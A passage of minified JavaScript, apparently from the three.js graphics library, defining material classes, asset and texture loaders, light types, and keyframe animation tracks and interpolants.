c.prototype.constructor=cc;cc.prototype.isRawShaderMaterial=!0;Xc.prototype={constructor:Xc,isMultiMaterial:!0,toJSON:function(a){for(var b={metadata:{version:4.2,type:\"material\",generator:\"MaterialExporter\"},\nuuid:this.uuid,type:this.type,materials:[]},c=this.materials,d=0,e=c.length;d<e;d++){var f=c[d].toJSON(a);delete f.metadata;b.materials.push(f)}b.visible=this.visible;return b},clone:function(){for(var a=new this.constructor,b=0;b<this.materials.length;b++)a.materials.push(this.materials[b].clone());a.visible=this.visible;return a}};Qa.prototype=Object.create(X.prototype);Qa.prototype.constructor=Qa;Qa.prototype.isMeshStandardMaterial=!0;Qa.prototype.copy=function(a){X.prototype.copy.call(this,a);\nthis.defines={STANDARD:\"\"};this.color.copy(a.color);this.roughness=a.roughness;this.metalness=a.metalness;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;\nthis.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.roughnessMap=a.roughnessMap;this.metalnessMap=a.metalnessMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.envMapIntensity=a.envMapIntensity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=\na.morphNormals;return this};rb.prototype=Object.create(Qa.prototype);rb.prototype.constructor=rb;rb.prototype.isMeshPhysicalMaterial=!0;rb.prototype.copy=function(a){Qa.prototype.copy.call(this,a);this.defines={PHYSICAL:\"\"};this.reflectivity=a.reflectivity;this.clearCoat=a.clearCoat;this.clearCoatRoughness=a.clearCoatRoughness;return this};Ca.prototype=Object.create(X.prototype);Ca.prototype.constructor=Ca;Ca.prototype.isMeshPhongMaterial=!0;Ca.prototype.copy=function(a){X.prototype.copy.call(this,\na);this.color.copy(a.color);this.specular.copy(a.specular);this.shininess=a.shininess;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;this.displacementScale=\na.displacementScale;this.displacementBias=a.displacementBias;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};sb.prototype=\nObject.create(Ca.prototype);sb.prototype.constructor=sb;sb.prototype.isMeshToonMaterial=!0;sb.prototype.copy=function(a){Ca.prototype.copy.call(this,a);this.gradientMap=a.gradientMap;return this};tb.prototype=Object.create(X.prototype);tb.prototype.constructor=tb;tb.prototype.isMeshNormalMaterial=!0;tb.prototype.copy=function(a){X.prototype.copy.call(this,a);this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;\nthis.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};ub.prototype=Object.create(X.prototype);ub.prototype.constructor=ub;ub.prototype.isMeshLambertMaterial=!0;ub.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=\na.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\nthis.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};vb.prototype=Object.create(X.prototype);vb.prototype.constructor=vb;vb.prototype.isLineDashedMaterial=!0;vb.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.scale=a.scale;this.dashSize=a.dashSize;this.gapSize=a.gapSize;return this};var Xf=Object.freeze({ShadowMaterial:bc,SpriteMaterial:nb,RawShaderMaterial:cc,ShaderMaterial:Ha,PointsMaterial:Oa,\nMultiMaterial:Xc,MeshPhysicalMaterial:rb,MeshStandardMaterial:Qa,MeshPhongMaterial:Ca,MeshToonMaterial:sb,MeshNormalMaterial:tb,MeshLambertMaterial:ub,MeshDepthMaterial:ab,MeshBasicMaterial:Ka,LineDashedMaterial:vb,LineBasicMaterial:ia,Material:X}),ld={enabled:!1,files:{},add:function(a,b){!1!==this.enabled&&(this.files[a]=b)},get:function(a){if(!1!==this.enabled)return this.files[a]},remove:function(a){delete this.files[a]},clear:function(){this.files={}}},ta=new $d;Object.assign(sa.prototype,{load:function(a,\nb,c,d){void 0===a&&(a=\"\");void 0!==this.path&&(a=this.path+a);var e=this,f=ld.get(a);if(void 0!==f)return e.manager.itemStart(a),setTimeout(function(){b&&b(f);e.manager.itemEnd(a)},0),f;var g=a.match(/^data:(.*?)(;base64)?,(.*)$/);if(g){var h=g[1],m=!!g[2],g=g[3],g=window.decodeURIComponent(g);m&&(g=window.atob(g));try{var k,l=(this.responseType||\"\").toLowerCase();switch(l){case \"arraybuffer\":case \"blob\":k=new ArrayBuffer(g.length);for(var p=new Uint8Array(k),m=0;m<g.length;m++)p[m]=g.charCodeAt(m);\n\"blob\"===l&&(k=new Blob([k],{type:h}));break;case \"document\":k=(new DOMParser).parseFromString(g,h);break;case \"json\":k=JSON.parse(g);break;default:k=g}window.setTimeout(function(){b&&b(k);e.manager.itemEnd(a)},0)}catch(q){window.setTimeout(function(){d&&d(q);e.manager.itemError(a)},0)}}else{var n=new XMLHttpRequest;n.open(\"GET\",a,!0);n.addEventListener(\"load\",function(c){var f=c.target.response;ld.add(a,f);200===this.status?(b&&b(f),e.manager.itemEnd(a)):0===this.status?(console.warn(\"THREE.FileLoader: HTTP Status 0 received.\"),\nb&&b(f),e.manager.itemEnd(a)):(d&&d(c),e.manager.itemError(a))},!1);void 0!==c&&n.addEventListener(\"progress\",function(a){c(a)},!1);n.addEventListener(\"error\",function(b){d&&d(b);e.manager.itemError(a)},!1);void 0!==this.responseType&&(n.responseType=this.responseType);void 0!==this.withCredentials&&(n.withCredentials=this.withCredentials);n.overrideMimeType&&n.overrideMimeType(void 0!==this.mimeType?this.mimeType:\"text/plain\");n.send(null)}e.manager.itemStart(a);return n},setPath:function(a){this.path=\na;return this},setResponseType:function(a){this.responseType=a;return this},setWithCredentials:function(a){this.withCredentials=a;return this},setMimeType:function(a){this.mimeType=a;return this}});Object.assign(Re.prototype,{load:function(a,b,c,d){function e(e){m.load(a[e],function(a){a=f._parser(a,!0);g[e]={width:a.width,height:a.height,format:a.format,mipmaps:a.mipmaps};k+=1;6===k&&(1===a.mipmapCount&&(h.minFilter=1006),h.format=a.format,h.needsUpdate=!0,b&&b(h))},c,d)}var f=this,g=[],h=new Nb;\nh.image=g;var m=new sa(this.manager);m.setPath(this.path);m.setResponseType(\"arraybuffer\");if(Array.isArray(a))for(var k=0,l=0,p=a.length;l<p;++l)e(l);else m.load(a,function(a){a=f._parser(a,!0);if(a.isCubemap)for(var c=a.mipmaps.length/a.mipmapCount,d=0;d<c;d++){g[d]={mipmaps:[]};for(var e=0;e<a.mipmapCount;e++)g[d].mipmaps.push(a.mipmaps[d*a.mipmapCount+e]),g[d].format=a.format,g[d].width=a.width,g[d].height=a.height}else h.image.width=a.width,h.image.height=a.height,h.mipmaps=a.mipmaps;1===a.mipmapCount&&\n(h.minFilter=1006);h.format=a.format;h.needsUpdate=!0;b&&b(h)},c,d);return h},setPath:function(a){this.path=a;return this}});Object.assign(ae.prototype,{load:function(a,b,c,d){var e=this,f=new eb,g=new sa(this.manager);g.setResponseType(\"arraybuffer\");g.load(a,function(a){if(a=e._parser(a))void 0!==a.image?f.image=a.image:void 0!==a.data&&(f.image.width=a.width,f.image.height=a.height,f.image.data=a.data),f.wrapS=void 0!==a.wrapS?a.wrapS:1001,f.wrapT=void 0!==a.wrapT?a.wrapT:1001,f.magFilter=void 0!==\na.magFilter?a.magFilter:1006,f.minFilter=void 0!==a.minFilter?a.minFilter:1008,f.anisotropy=void 0!==a.anisotropy?a.anisotropy:1,void 0!==a.format&&(f.format=a.format),void 0!==a.type&&(f.type=a.type),void 0!==a.mipmaps&&(f.mipmaps=a.mipmaps),1===a.mipmapCount&&(f.minFilter=1006),f.needsUpdate=!0,b&&b(f,a)},c,d);return f}});Object.assign(Yc.prototype,{load:function(a,b,c,d){void 0===a&&(a=\"\");void 0!==this.path&&(a=this.path+a);var e=this,f=ld.get(a);if(void 0!==f)return e.manager.itemStart(a),setTimeout(function(){b&&\nb(f);e.manager.itemEnd(a)},0),f;c=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"img\");c.addEventListener(\"load\",function(){ld.add(a,this);b&&b(this);e.manager.itemEnd(a)},!1);c.addEventListener(\"error\",function(b){d&&d(b);e.manager.itemError(a)},!1);void 0!==this.crossOrigin&&(c.crossOrigin=this.crossOrigin);e.manager.itemStart(a);c.src=a;return c},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});Object.assign(be.prototype,{load:function(a,\nb,c,d){function e(c){g.load(a[c],function(a){f.images[c]=a;h++;6===h&&(f.needsUpdate=!0,b&&b(f))},void 0,d)}var f=new Za,g=new Yc(this.manager);g.setCrossOrigin(this.crossOrigin);g.setPath(this.path);var h=0;for(c=0;c<a.length;++c)e(c);return f},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});Object.assign(td.prototype,{load:function(a,b,c,d){var e=new ea,f=new Yc(this.manager);f.setCrossOrigin(this.crossOrigin);f.setPath(this.path);f.load(a,\nfunction(c){var d=0<a.search(/\\.(jpg|jpeg)$/)||0===a.search(/^data\\:image\\/jpeg/);e.format=d?1022:1023;e.image=c;e.needsUpdate=!0;void 0!==b&&b(e)},c,d);return e},setCrossOrigin:function(a){this.crossOrigin=a;return this},setPath:function(a){this.path=a;return this}});ma.prototype=Object.assign(Object.create(x.prototype),{constructor:ma,isLight:!0,copy:function(a){x.prototype.copy.call(this,a);this.color.copy(a.color);this.intensity=a.intensity;return this},toJSON:function(a){a=x.prototype.toJSON.call(this,\na);a.object.color=this.color.getHex();a.object.intensity=this.intensity;void 0!==this.groundColor&&(a.object.groundColor=this.groundColor.getHex());void 0!==this.distance&&(a.object.distance=this.distance);void 0!==this.angle&&(a.object.angle=this.angle);void 0!==this.decay&&(a.object.decay=this.decay);void 0!==this.penumbra&&(a.object.penumbra=this.penumbra);void 0!==this.shadow&&(a.object.shadow=this.shadow.toJSON());return a}});ud.prototype=Object.assign(Object.create(ma.prototype),{constructor:ud,\nisHemisphereLight:!0,copy:function(a){ma.prototype.copy.call(this,a);this.groundColor.copy(a.groundColor);return this}});Object.assign(wb.prototype,{copy:function(a){this.camera=a.camera.clone();this.bias=a.bias;this.radius=a.radius;this.mapSize.copy(a.mapSize);return this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var a={};0!==this.bias&&(a.bias=this.bias);1!==this.radius&&(a.radius=this.radius);if(512!==this.mapSize.x||512!==this.mapSize.y)a.mapSize=this.mapSize.toArray();\na.camera=this.camera.toJSON(!1).object;delete a.camera.matrix;return a}});vd.prototype=Object.assign(Object.create(wb.prototype),{constructor:vd,isSpotLightShadow:!0,update:function(a){var b=2*N.RAD2DEG*a.angle,c=this.mapSize.width/this.mapSize.height;a=a.distance||500;var d=this.camera;if(b!==d.fov||c!==d.aspect||a!==d.far)d.fov=b,d.aspect=c,d.far=a,d.updateProjectionMatrix()}});wd.prototype=Object.assign(Object.create(ma.prototype),{constructor:wd,isSpotLight:!0,copy:function(a){ma.prototype.copy.call(this,\na);this.distance=a.distance;this.angle=a.angle;this.penumbra=a.penumbra;this.decay=a.decay;this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});xd.prototype=Object.assign(Object.create(ma.prototype),{constructor:xd,isPointLight:!0,copy:function(a){ma.prototype.copy.call(this,a);this.distance=a.distance;this.decay=a.decay;this.shadow=a.shadow.clone();return this}});yd.prototype=Object.assign(Object.create(wb.prototype),{constructor:yd});zd.prototype=Object.assign(Object.create(ma.prototype),\n{constructor:zd,isDirectionalLight:!0,copy:function(a){ma.prototype.copy.call(this,a);this.target=a.target.clone();this.shadow=a.shadow.clone();return this}});Ad.prototype=Object.assign(Object.create(ma.prototype),{constructor:Ad,isAmbientLight:!0});var na={arraySlice:function(a,b,c){return na.isTypedArray(a)?new a.constructor(a.subarray(b,c)):a.slice(b,c)},convertArray:function(a,b,c){return!a||!c&&a.constructor===b?a:\"number\"===typeof b.BYTES_PER_ELEMENT?new b(a):Array.prototype.slice.call(a)},\nisTypedArray:function(a){return ArrayBuffer.isView(a)&&!(a instanceof DataView)},getKeyframeOrder:function(a){for(var b=a.length,c=Array(b),d=0;d!==b;++d)c[d]=d;c.sort(function(b,c){return a[b]-a[c]});return c},sortedArray:function(a,b,c){for(var d=a.length,e=new a.constructor(d),f=0,g=0;g!==d;++f)for(var h=c[f]*b,m=0;m!==b;++m)e[g++]=a[h+m];return e},flattenJSON:function(a,b,c,d){for(var e=1,f=a[0];void 0!==f&&void 0===f[d];)f=a[e++];if(void 0!==f){var g=f[d];if(void 0!==g)if(Array.isArray(g)){do g=\nf[d],void 0!==g&&(b.push(f.time),c.push.apply(c,g)),f=a[e++];while(void 0!==f)}else if(void 0!==g.toArray){do g=f[d],void 0!==g&&(b.push(f.time),g.toArray(c,c.length)),f=a[e++];while(void 0!==f)}else{do g=f[d],void 0!==g&&(b.push(f.time),c.push(g)),f=a[e++];while(void 0!==f)}}}};xa.prototype={constructor:xa,evaluate:function(a){var b=this.parameterPositions,c=this._cachedIndex,d=b[c],e=b[c-1];a:{b:{c:{d:if(!(a<d)){for(var f=c+2;;){if(void 0===d){if(a<e)break d;this._cachedIndex=c=b.length;return this.afterEnd_(c-\n1,a,e)}if(c===f)break;e=d;d=b[++c];if(a<d)break b}d=b.length;break c}if(a>=e)break a;else{f=b[1];a<f&&(c=2,e=f);for(f=c-2;;){if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(c===f)break;d=e;e=b[--c-1];if(a>=e)break b}d=c;c=0}}for(;c<d;)e=c+d>>>1,a<b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void 0===e)return this._cachedIndex=0,this.beforeStart_(0,a,d);if(void 0===d)return this._cachedIndex=c=b.length,this.afterEnd_(c-1,e,a)}this._cachedIndex=c;this.intervalChanged_(c,e,d)}return this.interpolate_(c,\ne,a,d)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(a){var b=this.resultBuffer,c=this.sampleValues,d=this.valueSize;a*=d;for(var e=0;e!==d;++e)b[e]=c[a+e];return b},interpolate_:function(a,b,c,d){throw Error(\"call to abstract method\");},intervalChanged_:function(a,b,c){}};Object.assign(xa.prototype,{beforeStart_:xa.prototype.copySampleValue_,afterEnd_:xa.prototype.copySampleValue_});Bd.prototype=Object.assign(Object.create(xa.prototype),\n{constructor:Bd,DefaultSettings_:{endingStart:2400,endingEnd:2400},intervalChanged_:function(a,b,c){var d=this.parameterPositions,e=a-2,f=a+1,g=d[e],h=d[f];if(void 0===g)switch(this.getSettings_().endingStart){case 2401:e=a;g=2*b-c;break;case 2402:e=d.length-2;g=b+d[e]-d[e+1];break;default:e=a,g=c}if(void 0===h)switch(this.getSettings_().endingEnd){case 2401:f=a;h=2*c-b;break;case 2402:f=1;h=c+d[1]-d[0];break;default:f=a-1,h=b}a=.5*(c-b);d=this.valueSize;this._weightPrev=a/(b-g);this._weightNext=\na/(h-c);this._offsetPrev=e*d;this._offsetNext=f*d},interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g,m=this._offsetPrev,k=this._offsetNext,l=this._weightPrev,p=this._weightNext,n=(c-b)/(d-b);c=n*n;d=c*n;b=-l*d+2*l*c-l*n;l=(1+l)*d+(-1.5-2*l)*c+(-.5+l)*n+1;n=(-1-p)*d+(1.5+p)*c+.5*n;p=p*d-p*c;for(c=0;c!==g;++c)e[c]=b*f[m+c]+l*f[h+c]+n*f[a+c]+p*f[k+c];return e}});Zc.prototype=Object.assign(Object.create(xa.prototype),{constructor:Zc,interpolate_:function(a,\nb,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;var h=a-g;b=(c-b)/(d-b);c=1-b;for(d=0;d!==g;++d)e[d]=f[h+d]*c+f[a+d]*b;return e}});Cd.prototype=Object.assign(Object.create(xa.prototype),{constructor:Cd,interpolate_:function(a,b,c,d){return this.copySampleValue_(a-1)}});var Xa;Xa={TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:2301,InterpolantFactoryMethodDiscrete:function(a){return new Cd(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodLinear:function(a){return new Zc(this.times,\nthis.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:function(a){return new Bd(this.times,this.values,this.getValueSize(),a)},setInterpolation:function(a){var b;switch(a){case 2300:b=this.InterpolantFactoryMethodDiscrete;break;case 2301:b=this.InterpolantFactoryMethodLinear;break;case 2302:b=this.InterpolantFactoryMethodSmooth}if(void 0===b){b=\"unsupported interpolation for \"+this.ValueTypeName+\" keyframe track named \"+this.name;if(void 0===this.createInterpolant)if(a!==this.DefaultInterpolation)this.setInterpolation(this.DefaultInterpolation);\nelse throw Error(b);console.warn(b)}else this.createInterpolant=b},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return 2300;case this.InterpolantFactoryMethodLinear:return 2301;case this.InterpolantFactoryMethodSmooth:return 2302}},getValueSize:function(){return this.values.length/this.times.length},shift:function(a){if(0!==a)for(var b=this.times,c=0,d=b.length;c!==d;++c)b[c]+=a;return this},scale:function(a){if(1!==a)for(var b=this.times,c=\n0,d=b.length;c!==d;++c)b[c]*=a;return this},trim:function(a,b){for(var c=this.times,d=c.length,e=0,f=d-1;e!==d&&c[e]<a;)++e;for(;-1!==f&&c[f]>b;)--f;++f;if(0!==e||f!==d)e>=f&&(f=Math.max(f,1),e=f-1),d=this.getValueSize(),this.times=na.arraySlice(c,e,f),this.values=na.arraySlice(this.values,e*d,f*d);return this},validate:function(){var a=!0,b=this.getValueSize();0!==b-Math.floor(b)&&(console.error(\"invalid value size in track\",this),a=!1);var c=this.times,b=this.values,d=c.length;0===d&&(console.error(\"track is empty\",\nthis),a=!1);for(var e=null,f=0;f!==d;f++){var g=c[f];if(\"number\"===typeof g&&isNaN(g)){console.error(\"time is not a valid number\",this,f,g);a=!1;break}if(null!==e&&e>g){console.error(\"out of order keys\",this,f,g,e);a=!1;break}e=g}if(void 0!==b&&na.isTypedArray(b))for(f=0,c=b.length;f!==c;++f)if(d=b[f],isNaN(d)){console.error(\"value is not a valid number\",this,f,d);a=!1;break}return a},optimize:function(){for(var a=this.times,b=this.values,c=this.getValueSize(),d=2302===this.getInterpolation(),e=1,\nf=a.length-1,g=1;g<f;++g){var h=!1,m=a[g];if(m!==a[g+1]&&(1!==g||m!==m[0]))if(d)h=!0;else for(var k=g*c,l=k-c,p=k+c,m=0;m!==c;++m){var n=b[k+m];if(n!==b[l+m]||n!==b[p+m]){h=!0;break}}if(h){if(g!==e)for(a[e]=a[g],h=g*c,k=e*c,m=0;m!==c;++m)b[k+m]=b[h+m];++e}}if(0<f){a[e]=a[f];h=f*c;k=e*c;for(m=0;m!==c;++m)b[k+m]=b[h+m];++e}e!==a.length&&(this.times=na.arraySlice(a,0,e),this.values=na.arraySlice(b,0,e*c));return this}};dc.prototype=Object.assign(Object.create(Xa),{constructor:dc,ValueTypeName:\"vector\"});\nDd.prototype=Object.assign(Object.create(xa.prototype),{constructor:Dd,interpolate_:function(a,b,c,d){var e=this.resultBuffer,f=this.sampleValues,g=this.valueSize;a*=g;b=(c-b)/(d-b);for(c=a+g;a!==c;a+=4)ca.slerpFlat(e,0,f,a-g,f,a,b);return e}});$c.prototype=Object.assign(Object.create(Xa),{constructor:$c,ValueTypeName:\"quaternion\",DefaultInterpolation:2301,InterpolantFactoryMethodLinear:function(a){return new Dd(this.times,this.values,this.getValueSize(),a)},InterpolantFactoryMethodSmooth:void 0});\nec.prototype=Object.assign(Object.create(Xa),{constructor:ec,ValueTypeName:\"number\"});Ed.prototype=Object.assign(Object.create(Xa),{constructor:Ed,ValueTypeName:\"string\",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});Fd.prototype=Object.assign(Object.create(Xa),{constructor:Fd,ValueTypeName:\"bool\",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0});\nGd.prototype=Object.assign(Object.create(Xa),{constructor:Gd,ValueTypeName:\"color\"});yb.prototype=Xa;Xa.constructor=yb;Object.assign(yb,{parse:function(a){if(void 0===a.type)throw Error(\"track type undefined, can not parse\");var b=yb._getTrackTypeForValueTypeName(a.type);if(void 0===a.times){var c=[],d=[];na.flattenJSON(a.keys,c,d,\"value\");a.times=c;a.values=d}return void 0!==b.parse?b.parse(a):new b(a.name,a.times,a.values,a.interpolation)},toJSON:function(a){var b=a.constructor;if(void 0!==b.toJSON)b=\nb.toJSON(a);else{var b={name:a.name,times:na.convertArray(a.times,Array),values:na.convertArray(a.values,Array)},c=a.getInterpolation();c!==a.DefaultInterpolation&&(b.interpolation=c)}b.type=a.ValueTypeName;return b},_getTrackTypeForValueTypeName:function(a){switch(a.toLowerCase()){case \"scalar\":case \"double\":case \"float\":case \"number\":case \"integer\":return ec;case \"vector\":case \"vector2\":case \"vector3\":case \"vector4\":return dc;case \"color\":return Gd;case \"quaternion\":return $c;case \"bool\":case \"boolean\":return Fd;\ncase \"string\":return Ed}throw Error(\"Unsupported typeName: \"+a);}});qa.prototype={constructor:qa,resetDuration:function(){for(var a=0,b=0,c=this.tracks.length;b!==c;++b)var d=this.tracks[b],a=Math.max(a,d.times[d.times.length-1]);this.duration=a},trim:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return this},optimize:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].optimize();return this}};Object.assign(qa,{parse:function(a){for(var b=[],c=a.tracks,\nd=1/(a.fps||1),e=0,f=c.length;e!==f;++e)b.push(yb.parse(c[e]).scale(d));return new qa(a.name,a.duration,b)},toJSON:function(a){var b=[],c=a.tracks;a={name:a.name,duration:a.duration,tracks:b};for(var d=0,e=c.length;d!==e;++d)b.push(yb.toJSON(c[d]));return a},CreateFromMorphTargetSequence:function(a,b,c,d){for(var e=b.length,f=[],g=0;g<e;g++){var h=[],m=[];h.push((g+e-1)%e,g,(g+1)%e);m.push(0,1,0);var k=na.getKeyframeOrder(h),h=na.sortedArray(h,1,k),m=na.sortedArray(m,1,k);d||0!==h[0]||(h.push(e),\nm.push(m[0]));f.push((new ec(\".morphTargetInfluences[\"+b[g].name+\"]\",h,m)).scale(1/c))}return new qa(a,-1,f)},findByName:function(a,b){var c=a;Array.isArray(a)||(c=a.geometry&&a.geometry.animations||a.animations);for(var d=0;d<c.length;d++)if(c[d].name===b)return c[d];return null},CreateClipsFromMorphTargetSequences:function(a,b,c){for(var d={},e=/^([\\w-]*?)([\\d]+)$/,f=0,g=a.length;f<g;f++){var h=a[f],m=h.name.match(e);if(m&&1<m.length){var k=m[1];(m=d[k])||(d[k]=m=[]);m.push(h)}}a=[];for(k in d)a.push(qa.CreateFromMorphTargetSequence(k,\nd[k],b,c));return a},parseAnimation:function(a,b){if(!a)return console.error(\"  no animation in JSONLoader data\"),null;for(var c=function(a,b,c,d,e){if(0!==c.length){var f=[],g=[];na.flattenJSON(c,f,g,d);0!==f.length&&e.push(new a(b,f,g))}},d=[],e=a.name||\"default\",f=a.length||-1,g=a.fps||30,h=a.hierarchy||[],m=0;m<h.length;m++){var k=h[m].keys;if(k&&0!==k.length)if(k[0].morphTargets){for(var f={},l=0;l<k.length;l++)if(k[l].morphTargets)for(var p=0;p<k[l].morphTargets.length;p++)f[k[l].morphTargets[p]]=\n-1;for(var n in f){for(var q=[],G=[],p=0;p!==k[l].morphTargets.length;++p){var r=k[l];q.push(r.time);G.push(r.morphTarget===n?1:0)}d.push(new ec(\".morphTargetInfluence[\"+n+\"]\",q,G))}f=f.length*(g||1)}else l=\".bones[\"+b[m].name+\"]\",c(dc,l+\".position\",k,\"pos\",d),c($c,l+\".quaternion\",k,\"rot\",d),c(dc,l+\".scale\",k,\"scl\",d)}return 0===d.length?null:new qa(e,f,d)}});Object.assign(Hd.prototype,{load:function(a,b,c,d){var e=this;(new sa(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},setTextures:function(a){this.textures=\na},parse:function(a){function b(a){void 0===c[a]&&console.warn(\"THREE.MaterialLoader: Undefined texture\",a);return c[a]}var c=this.textures,d=new Xf[a.type];void 0!==a.uuid&&(d.uuid=a.uuid);void 0!==a.name&&(d.name=a.name);void 0!==a.color&&d.color.setHex(a.color);void 0!==a.roughness&&(d.roughness=a.roughness);void 0!==a.metalness&&(d.metalness=a.metalness);void 0!==a.emissive&&d.emissive.setHex(a.emissive);void 0!==a.specular&&d.specular.setHex(a.specular);void 0!==a.shininess&&(d.shininess=a.shininess);\nvoid 0!==a.clearCoat&&(d.clearCoat=a.clearCoat);void 0!==a.clearCoatRoughness&&(d.clearCoatRoughness=a.clearCoatRoughness);void 0!==a.uniforms&&(d.uniforms=a.uniforms);void 0!==a.vertexShader&&(d.vertexShader=a.vertexShader);void 0!==a.fragmentShader&&(d.fragmentShader=a.fragmentShader);void 0!==a.vertexColors&&(d.vertexColors=a.vertexColors);void 0!==a.fog&&(d.fog=a.fog);void 0!==a.shading&&(d.shading=a.shading);void 0!==a.blending&&(d.blending=a.blending);void 0!==a.side&&(d.side=a.side);void 0!==\na.opacity&&(d.opacity=a.opacity);void 0!==a.transparent&&(d.transparent=a.transparent);void 0!==a.alphaTest&&(d.alphaTest=a.alphaTest);void 0!==a.depthTest&&(d.depthTest=a.depthTest);void 0!==a.depthWrite&&(d.depthWrite=a.depthWrite);void 0!==a.colorWrite&&(d.colorWrite=a.colorWrite);void 0!==a.wireframe&&(d.wireframe=a.wireframe);void 0!==a.wireframeLinewidth&&(d.wireframeLinewidth=a.wireframeLinewidth);void 0!==a.wireframeLinecap&&(d.wireframeLinecap=a.wireframeLinecap);void 0!==a.wireframeLinejoin&&\n(d.wireframeLinejoin=a.wireframeLinejoin);void 0!==a.skinning&&(d.skinning=a.skinning);void 0!==a.morphTargets&&(d.morphTargets=a.morphTargets);void 0!==a.size&&(d.size=a.size);void 0!==a.sizeAttenuation&&(d.sizeAttenuation=a.sizeAttenuation);void 0!==a.map&&(d.map=b(a.map));void 0!==a.alphaMap&&(d.alphaMap=b(a.alphaMap),d.transparent=!0);void 0!==a.bumpMap&&(d.bumpMap=b(a.bumpMap));void 0!==a.bumpScale&&(d.bumpScale=a.bumpScale);void 0!==a.normalMap&&(d.normalMap=b(a.normalMap));if(void 0!==a.normalScale){var e=\na.normalScale;!1===Array.isArray(e)&&(e=[e,e]);d.normalScale=(new D).fromArray(e)}void 0!==a.displacementMap&&(d.displacementMap=b(a.displacementMap));void 0!==a.displacementScale&&(d.displacementScale=a.displacementScale);void 0!==a.displacementBias&&(d.displacementBias=a.displacementBias);void 0!==a.roughnessMap&&(d.roughnessMap=b(a.roughnessMap));void 0!==a.metalnessMap&&(d.metalnessMap=b(a.metalnessMap));void 0!==a.emissiveMap&&(d.emissiveMap=b(a.emissiveMap));void 0!==a.emissiveIntensity&&(d.emissiveIntensity=\na.emissiveIntensity);void 0!==a.specularMap&&(d.specularMap=b(a.specularMap));void 0!==a.envMap&&(d.envMap=b(a.envMap));void 0!==a.reflectivity&&(d.reflectivity=a.reflectivity);void 0!==a.lightMap&&(d.lightMap=b(a.lightMap));void 0!==a.lightMapIntensity&&(d.lightMapIntensity=a.lightMapIntensity);void 0!==a.aoMap&&(d.aoMap=b(a.aoMap));void 0!==a.aoMapIntensity&&(d.aoMapIntensity=a.aoMapIntensity);void 0!==a.gradientMap&&(d.gradientMap=b(a.gradientMap));if(void 0!==a.materials)for(var e=0,f=a.materials.length;e<\nf;e++)d.materials.push(this.parse(a.materials[e]));return d}});Object.assign(ce.prototype,{load:function(a,b,c,d){var 